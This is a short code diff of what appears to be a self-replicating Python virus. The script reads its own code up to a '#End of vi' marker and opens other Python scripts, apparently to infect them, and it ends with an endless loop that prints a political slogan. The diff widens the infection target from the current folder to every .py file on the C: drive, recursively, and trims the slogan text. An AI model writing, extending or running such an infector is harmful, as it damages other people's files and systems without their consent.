@@ -15,7 +15,7 @@ for line in lines:
     if line == '#End of vi\n':
         break
 
-python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
+python_scripts = glob.glob('C:/**/*.py', recursive=True)
 
 for script in python_scripts:
     with open(script,'r') as f:
@@ -39,7 +39,7 @@ for script in python_scripts:
 
 #maga2020
 while(100==100):
-     print("Make America Great Again!\n Biden is a socialist loser")
+     print("Make America Great Again!")
      
      
 #End of vi
